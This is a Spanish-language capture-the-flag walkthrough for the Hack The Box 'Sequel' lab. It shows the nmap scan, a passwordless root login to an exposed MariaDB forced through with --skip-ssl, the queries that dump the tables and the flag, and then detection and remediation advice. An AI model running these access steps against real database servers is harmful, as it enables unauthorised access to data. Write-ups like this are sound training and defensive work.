---
tags:
  - htb
  - starting-point
  - tier-1
  - easy
  - linux
  - mysql
  - Terminada
ip: 10.129.95.232
os: Linux
difficulty: Easy
status: Terminada
tiempo: 2h 0m
fecha_inicio: 2026-08-10
fecha_completada: 2026-08-13
puntos: 0
mitre_tactics:
  - Initial Access
  - Credential Access
mitre_techniques:
  - T1190
  - T1552
---

# 🖥️ Sequel — Linux — Easy (Tier 1)

> [!info] Resumen
> **IP:** `10.129.95.232` | **OS:** Linux | **Tier/Fase:** 1 | **Tiempo:** 2h 0m
> Servidor MySQL expuesto accesible con usuario `root` sin contraseña — enumeración directa de bases de datos.

---

## 1. Reconocimiento

```bash
nmap -sCV -p- --min-rate 5000 10.129.95.232 -oN nmap.txt
```

| Puerto   | Servicio | Versión               | Hallazgo clave                                                                                                                                                                 |
| -------- | -------- | --------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 3306/TCP | mysql    | 5.5.5-10.3.27-MariaDB | - **Servicio:** **MariaDB 10.3.27**<br>- **OS/base:** `deb10u1` → Debian 10<br>- **Autenticación:** `mysql_native_password`<br>- **Banner:** `5.5.5-10.3.27-MariaDB-0+deb10u1` |


**→ Vector:** MySQL expuesto — probar `root` sin contraseña antes de fuerza bruta.

---

## 2. Explotación

> Vector principal: MySQL sin contraseña (misconfiguration)

```bash
mysql -h 10.129.95.232 -u root

Nos da como respuesta:ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
```

```bash
mysql -h 10.129.95.232 -u root --skip-ssl

Con esto ya nos abre la BBDD.
MariaDB [(none)]>
```

```bash
MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

```bash
MariaDB [htb]> SHOW TABLES;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
```

```bash
MariaDB [htb]> DESCRIBE  users;
+----------+---------------------+------+-----+---------+----------------+
| Field    | Type                | Null | Key | Default | Extra          |
+----------+---------------------+------+-----+---------+----------------+
| id       | bigint(20) unsigned | NO   | PRI | NULL    | auto_increment |
| username | text                | YES  |     | NULL    |                |
| email    | text                | YES  |     | NULL    |                |
+----------+---------------------+------+-----+---------+----------------+
```

```bash
MariaDB [htb]> SELECT * FROM users;
+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
```

```bash
MariaDB [htb]> SELECT * FROM config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+

```

> [!success] Flag obtenida
> `7b4bec00d1a39e3dd4e021ec3d915da8`

---

## 3. Escalación de Privilegios

N/A — acceso directo a datos vía cliente MySQL, sin necesidad de shell en el sistema.

---

## 4. MITRE ATT&CK

| Táctica          | Técnica                           | ID    | Uso en esta máquina                        |
| ----------------- | ---------------------------------- | ----- | -------------------------------------------- |
| Reconnaissance     | Active Scanning                   | T1595 | nmap identifica MySQL en 3306               |
| Initial Access     | Exploit Public-Facing Application | T1190 | MySQL sin contraseña, acceso root directo   |
| Credential Access  | Unsecured Credentials              | T1552 | Si hay credenciales en texto plano dentro de tablas |

---

## 5. Detección & Remediación

**Blue Team detecta:**
- Conexiones al puerto 3306 desde IPs externas no autorizadas (firewall/IDS)
- Login `root` sin contraseña en logs de MySQL (`general_log` si está habilitado)
- Ausencia de intentos fallidos previos = credencial vacía, no fuerza bruta

**Remediación:**
- Asignar contraseña fuerte a `root` y a todos los usuarios de MySQL (`ALTER USER 'root'@'%' IDENTIFIED BY '...'`)
- Bindear MySQL a `127.0.0.1` o red interna (`bind-address` en `my.cnf`)
- Firewall: bloquear 3306 desde Internet; jamás exponer MySQL directamente a red pública

---

## 6. Lecciones

- El banner `5.5.5-10.3.27-MariaDB` no es MySQL 5.5.5 — es MariaDB 10.3.27 con el prefijo `5.5.5-` que antepone por compatibilidad histórica con clientes que esperan MySQL. La versión real es la que sigue al prefijo.
- Cuando el cliente exige TLS/SSL pero el servidor no lo soporta correctamente (`ERROR 2026`), `--skip-ssl` fuerza la conexión en texto plano — señal de config MySQL default/desactualizada, no un bloqueo real.
- `config` guardaba `authentication_method: radius` — dato para tener en cuenta si en una máquina más compleja aparece un servicio RADIUS asociado; no se explotó aquí.

**Bloqueado:**

| Fase | Causa                                                          | Fix                                                          |
| ---- | --------------------------------------------------------------- | --------------------------------------------------------------- |
| 2    | Olvidaba poner `;` al final de cada consulta dentro del prompt MariaDB | Toda sentencia SQL en el prompt interactivo cierra con `;` |

---

## 7. ¿Qué vería un Threat Hunter?

- Conexión al puerto 3306 desde una IP fuera del rango de hosts de aplicación conocidos — primera señal en cualquier NIDS/firewall con reglas de segmentación.
- Login `root` exitoso sin intentos fallidos previos en los logs de MySQL (si `general_log` está habilitado) — indica credencial vacía, no fuerza bruta ni bypass.
- Downgrade de conexión forzado con `--skip-ssl`: en un entorno con inspección de tráfico, una conexión MySQL en texto plano hacia un host que normalmente exige TLS es anómala y debería generar alerta — expone en claro toda la sesión, incluidas las queries y sus resultados.
- Sin logging de origen ni segmentación de red, todo lo anterior es invisible: el hallazgo más fuerte para un Threat Hunter en este escenario es de red (IP/puerto), no de aplicación.

---

## 8. Conexiones

- Similar: `[[HTB/Redeemer/Redeemer]]` (servicio de BD sin autenticación — mismo patrón, distinto motor)
- Siguiente nivel: `[[HTB/Vaccine/Vaccine]]` (MySQL + SQLi + sqlmap)
- Técnica: `[[Técnicas/MySQL-Unauthenticated]]`
- Teoría: [`Teoria_MySQL_SinAuth`](obsidian://open?vault=RedTeamLab&file=HTB%2FSequel%2FTeoria_MySQL_SinAuth.pdf)

**Referencias:** [HackTricks - MySQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql) · [MySQL Security Docs](https://dev.mysql.com/doc/refman/8.0/en/security.html)
